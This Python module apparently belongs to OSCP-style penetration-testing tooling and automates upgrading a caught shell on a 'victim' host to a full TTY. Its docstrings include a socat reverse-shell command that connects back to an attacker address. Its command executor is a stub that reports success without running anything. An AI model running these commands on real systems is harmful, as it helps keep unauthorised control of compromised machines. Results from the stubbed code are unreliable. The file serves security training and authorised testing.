"""
Shell upgrade automation - implements IShellEnhancer.

Comprehensive shell upgrade system supporting:
- Python PTY upgrade (python/python3)
- script /dev/null upgrade
- socat full TTY upgrade
- expect-based upgrade
- Auto-detection and fallback chains

OSCP Focus: Manual alternatives provided for exam scenarios.
"""

import logging
import time
from typing import Optional, List, Dict, Any
from ..models import Session, ShellCapabilities
from ..interfaces import IShellEnhancer
from ..config import SessionConfig
from ..events import EventBus, SessionEvent
from .detector import ShellDetector

logger = logging.getLogger(__name__)


class ShellUpgrader(IShellEnhancer):
    """Comprehensive shell upgrade automation.

    Implements IShellEnhancer interface with support for multiple
    upgrade methods. Automatically selects best method based on
    detected capabilities.

    Upgrade Methods:
        - python-pty: Python pty.spawn() upgrade (most reliable)
        - python2-pty: Python 2 variant
        - script: script /dev/null upgrade (common)
        - socat: Socat full TTY (requires upload)
        - expect: expect-based upgrade (rare)

    Example:
        >>> upgrader = ShellUpgrader()
        >>> session = Session(type='tcp', target='192.168.45.150', port=4444)
        >>>
        >>> # Auto-detect and upgrade
        >>> if upgrader.upgrade_shell(session, 'auto'):
        ...     print("Shell upgraded successfully!")
        >>>
        >>> # Validate upgrade
        >>> if upgrader.validate_upgrade(session):
        ...     print("Upgrade validated - PTY functional")
    """

    def __init__(self, detector: Optional[ShellDetector] = None,
                 config: Optional[SessionConfig] = None,
                 command_executor=None):
        """Initialize upgrader.

        Args:
            detector: ShellDetector instance (creates new if None)
            config: SessionConfig instance (creates new if None)
            command_executor: Optional command executor (for testing)
        """
        self.detector = detector or ShellDetector(command_executor)
        self.config = config or SessionConfig()
        self.command_executor = command_executor

    def detect_capabilities(self, session: Session) -> ShellCapabilities:
        """Detect shell capabilities.

        Delegates to ShellDetector for comprehensive capability detection.

        Args:
            session: Session to probe

        Returns:
            ShellCapabilities with detected features

        Example:
            >>> caps = upgrader.detect_capabilities(session)
            >>> print(f"Shell: {caps.shell_type}")
            >>> print(f"Available tools: {caps.detected_tools}")
        """
        caps = self.detector.detect_capabilities(session)

        # Update session capabilities
        session.capabilities = caps

        return caps

    def upgrade_shell(self, session: Session, method: str = 'auto') -> bool:
        """Upgrade shell to full TTY.

        Args:
            session: Session to upgrade
            method: Upgrade method ('auto', 'python-pty', 'python2-pty',
                                   'script', 'socat', 'expect')

        Returns:
            True if upgrade successful

        Raises:
            ValueError: If method not supported or requirements not met

        Example:
            >>> # Auto-select best method
            >>> if upgrader.upgrade_shell(session, 'auto'):
            ...     print("Upgraded successfully")
            >>>
            >>> # Force specific method
            >>> if upgrader.upgrade_shell(session, 'python-pty'):
            ...     print("Python PTY upgrade successful")
        """
        logger.info(f"Upgrading shell for session {session.id[:8]} using method: {method}")

        # Mark session as upgrading
        session.mark_upgrading()

        try:
            if method == 'auto':
                success = self.auto_upgrade(session)
            elif method == 'python-pty':
                success = self.upgrade_python_pty(session, 'python3')
            elif method == 'python2-pty':
                success = self.upgrade_python_pty(session, 'python')
            elif method == 'script':
                success = self.upgrade_script(session)
            elif method == 'socat':
                success = self.upgrade_socat(session)
            elif method == 'expect':
                success = self.upgrade_expect(session)
            else:
                raise ValueError(f"Unknown upgrade method: {method}")

            if success:
                # Update capabilities
                session.capabilities.has_pty = True
                session.mark_active()

                # Publish upgrade event
                EventBus.publish(SessionEvent.SESSION_UPGRADED, {
                    'session_id': session.id,
                    'method': method,
                    'shell_type': session.capabilities.shell_type
                })

                logger.info(f"Shell upgrade successful: {method}")
            else:
                session.mark_active()
                logger.warning(f"Shell upgrade failed: {method}")

            return success

        except Exception as e:
            session.mark_active()
            logger.error(f"Shell upgrade error: {e}")
            return False

    def upgrade_python_pty(self, session: Session, python_binary: str = 'python3') -> bool:
        """Python PTY upgrade.

        Most reliable upgrade method. Uses Python's pty module to spawn
        an interactive bash shell with full TTY support.

        Steps:
            1. Spawn PTY: python3 -c 'import pty; pty.spawn("/bin/bash")'
            2. Background: Ctrl+Z (requires manual terminal interaction)
            3. Raw mode: stty raw -echo; fg
            4. Export TERM: export TERM=xterm-256color
            5. Fix size: stty rows X cols Y

        Args:
            session: Session to upgrade
            python_binary: Python binary name ('python3' or 'python')

        Returns:
            True if upgrade successful

        OSCP Manual Alternative:
            ```bash
            # On victim shell:
            python3 -c 'import pty; pty.spawn("/bin/bash")'

            # Background with Ctrl+Z (press keys)

            # On attacker terminal:
            stty raw -echo; fg

            # Back in victim shell:
            export TERM=xterm-256color
            stty rows 38 cols 116
            ```

        Example:
            >>> if upgrader.upgrade_python_pty(session, 'python3'):
            ...     print("Python 3 PTY upgrade successful")
        """
        logger.info(f"Attempting Python PTY upgrade with {python_binary}")

        # Check if python available
        caps = session.capabilities
        if python_binary not in caps.detected_tools:
            logger.warning(f"{python_binary} not available")
            return False

        # Get payload from config
        payload = self.config.get_upgrade_payload('python_pty')
        if not payload:
            # Fallback to hardcoded
            payload = f'{python_binary} -c "import pty; pty.spawn(\'/bin/bash\')"'

        # Execute payload
        success = self._execute_command(session, payload)

        if success:
            # Wait for PTY to spawn
            time.sleep(1)

            logger.info("Python PTY upgrade commands sent")
            return True

        return False

    def upgrade_script(self, session: Session) -> bool:
        """script /dev/null upgrade.

        Alternative upgrade using script command. Less reliable than
        Python PTY but more widely available.

        Command:
            script /dev/null -c bash

        Args:
            session: Session to upgrade

        Returns:
            True if upgrade successful

        OSCP Manual Alternative:
            ```bash
            # On victim shell:
            script /dev/null -c bash
            ```

        Example:
            >>> if upgrader.upgrade_script(session):
            ...     print("Script upgrade successful")
        """
        logger.info("Attempting script upgrade")

        # Check if script available
        caps = session.capabilities
        if 'script' not in caps.detected_tools:
            logger.warning("script not available")
            return False

        # Get payload from config
        payload = self.config.get_upgrade_payload('script')
        if not payload:
            payload = 'script /dev/null -c bash'

        # Execute payload
        success = self._execute_command(session, payload)

        if success:
            time.sleep(1)
            logger.info("Script upgrade commands sent")
            return True

        return False

    def upgrade_socat(self, session: Session) -> bool:
        """Socat full TTY upgrade.

        Most feature-complete upgrade. Requires socat binary on victim.
        Creates full bidirectional TTY connection.

        Steps:
            1. On attacker: socat file:`tty`,raw,echo=0 tcp-listen:4445
            2. On victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4445

        Args:
            session: Session to upgrade

        Returns:
            True if upgrade successful

        OSCP Manual Alternative:
            ```bash
            # On attacker:
            socat file:`tty`,raw,echo=0 tcp-listen:4445

            # On victim:
            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.X:4445
            ```

        Flags Explained:
            - file:`tty`: Use current TTY
            - raw: Raw terminal mode
            - echo=0: Disable echo
            - exec:'bash -li': Execute interactive bash
            - pty: Create pseudo-terminal
            - stderr: Redirect stderr
            - setsid: New session
            - sigint,sane: Handle signals properly

        Example:
            >>> if upgrader.upgrade_socat(session):
            ...     print("Socat upgrade successful - full TTY!")
        """
        logger.info("Attempting socat upgrade")

        # Check if socat available
        caps = session.capabilities
        if 'socat' not in caps.detected_tools:
            logger.warning("socat not available")
            return False

        # TODO: Implement socat listener setup
        # This requires coordinating with attacker-side listener
        logger.warning("Socat upgrade requires manual listener setup")
        return False

    def upgrade_expect(self, session: Session) -> bool:
        """Expect-based upgrade.

        Uses expect to spawn interactive shell. Rarely available
        but included for completeness.

        Command:
            expect -c 'spawn /bin/bash; interact'

        Args:
            session: Session to upgrade

        Returns:
            True if upgrade successful

        OSCP Manual Alternative:
            ```bash
            # On victim:
            expect -c 'spawn /bin/bash; interact'
            ```

        Example:
            >>> if upgrader.upgrade_expect(session):
            ...     print("Expect upgrade successful")
        """
        logger.info("Attempting expect upgrade")

        # Check if expect available
        caps = session.capabilities
        if 'expect' not in caps.detected_tools:
            logger.warning("expect not available")
            return False

        # Get payload from config
        payload = self.config.get_upgrade_payload('expect')
        if not payload:
            payload = "expect -c 'spawn /bin/bash; interact'"

        # Execute payload
        success = self._execute_command(session, payload)

        if success:
            time.sleep(1)
            logger.info("Expect upgrade commands sent")
            return True

        return False

    def auto_upgrade(self, session: Session) -> bool:
        """Auto-select and execute best upgrade method.

        Tries upgrade methods in priority order:
            1. Python 3 PTY (most reliable)
            2. Python 2 PTY (fallback)
            3. script (widely available)
            4. expect (rarely available)

        Args:
            session: Session to upgrade

        Returns:
            True if any upgrade method succeeded

        Example:
            >>> if upgrader.auto_upgrade(session):
            ...     print("Successfully upgraded with best available method")
            >>> else:
            ...     print("All upgrade methods failed")
        """
        logger.info("Auto-selecting upgrade method")

        # Detect capabilities first
        caps = self.detect_capabilities(session)

        # Priority list
        methods: List[tuple[str, str]] = []

        # Python 3
        if 'python3' in caps.detected_tools:
            methods.append(('python-pty', 'python3'))

        # Python 2
        if 'python' in caps.detected_tools or 'python2' in caps.detected_tools:
            methods.append(('python2-pty', 'python'))

        # script
        if 'script' in caps.detected_tools:
            methods.append(('script', 'script'))

        # expect
        if 'expect' in caps.detected_tools:
            methods.append(('expect', 'expect'))

        # Try each method
        for method_name, tool in methods:
            logger.info(f"Trying upgrade method: {method_name} (using {tool})")

            if method_name.endswith('-pty'):
                success = self.upgrade_python_pty(session, tool)
            elif method_name == 'script':
                success = self.upgrade_script(session)
            elif method_name == 'expect':
                success = self.upgrade_expect(session)
            else:
                continue

            if success:
                logger.info(f"Auto-upgrade successful with method: {method_name}")
                return True

        logger.warning("All auto-upgrade methods failed")
        return False

    def stabilize_shell(self, session: Session) -> bool:
        """Stabilize shell after upgrade.

        Delegates to ShellStabilizer (imported lazily to avoid circular deps).

        Args:
            session: Session to stabilize

        Returns:
            True if stabilization successful

        Example:
            >>> if upgrader.upgrade_shell(session, 'auto'):
            ...     if upgrader.stabilize_shell(session):
            ...         print("Shell fully stabilized")
        """
        from .stabilizer import ShellStabilizer

        stabilizer = ShellStabilizer(command_executor=self.command_executor)
        return stabilizer.stabilize(session)

    def validate_upgrade(self, session: Session) -> bool:
        """Validate upgrade success.

        Tests:
            - PTY status (tty command)
            - Terminal size (stty size)
            - Basic interactivity

        Args:
            session: Session to validate

        Returns:
            True if upgrade validated successful

        Example:
            >>> if upgrader.validate_upgrade(session):
            ...     print("Upgrade verified - PTY functional")
            ...     session.capabilities.has_pty = True
        """
        logger.info("Validating shell upgrade")

        # Check PTY status
        has_pty = self.detector.check_pty_status(session)

        if not has_pty:
            logger.warning("Validation failed: No PTY detected")
            return False

        # Check terminal size
        size = self.detector.get_terminal_size(session)
        if size:
            logger.info(f"Terminal size: {size['rows']}x{size['cols']}")

        logger.info("Upgrade validation successful")
        return True

    def _execute_command(self, session: Session, command: str) -> bool:
        """Execute command on session.

        Args:
            session: Session to execute on
            command: Command to execute

        Returns:
            True if command executed (doesn't validate output)
        """
        if self.command_executor:
            # Use injected executor (for testing)
            self.command_executor(session, command)
            return True

        # TODO: Real implementation will use session's command execution
        # For now, return True
        # In production: return session.execute_command(command)
        return True

    def get_upgrade_recommendations(self, session: Session) -> List[Dict[str, Any]]:
        """Get recommended upgrade methods based on detected capabilities.

        Args:
            session: Session to analyze

        Returns:
            List of upgrade recommendations with priority and instructions

        Example:
            >>> recommendations = upgrader.get_upgrade_recommendations(session)
            >>> for rec in recommendations:
            ...     print(f"{rec['priority']}: {rec['method']} - {rec['description']}")
        """
        caps = session.capabilities if session.capabilities else self.detect_capabilities(session)

        recommendations = []

        # Python 3 PTY
        if 'python3' in caps.detected_tools:
            recommendations.append({
                'priority': 1,
                'method': 'python-pty',
                'tool': 'python3',
                'description': 'Python 3 PTY upgrade (most reliable)',
                'command': 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                'oscp_safe': True
            })

        # Python 2 PTY
        if 'python' in caps.detected_tools or 'python2' in caps.detected_tools:
            recommendations.append({
                'priority': 2,
                'method': 'python2-pty',
                'tool': 'python/python2',
                'description': 'Python 2 PTY upgrade',
                'command': 'python -c \'import pty; pty.spawn("/bin/bash")\'',
                'oscp_safe': True
            })

        # script
        if 'script' in caps.detected_tools:
            recommendations.append({
                'priority': 3,
                'method': 'script',
                'tool': 'script',
                'description': 'script /dev/null upgrade (common)',
                'command': 'script /dev/null -c bash',
                'oscp_safe': True
            })

        # expect
        if 'expect' in caps.detected_tools:
            recommendations.append({
                'priority': 4,
                'method': 'expect',
                'tool': 'expect',
                'description': 'Expect-based upgrade',
                'command': 'expect -c \'spawn /bin/bash; interact\'',
                'oscp_safe': True
            })

        # Sort by priority
        recommendations.sort(key=lambda x: x['priority'])

        return recommendations
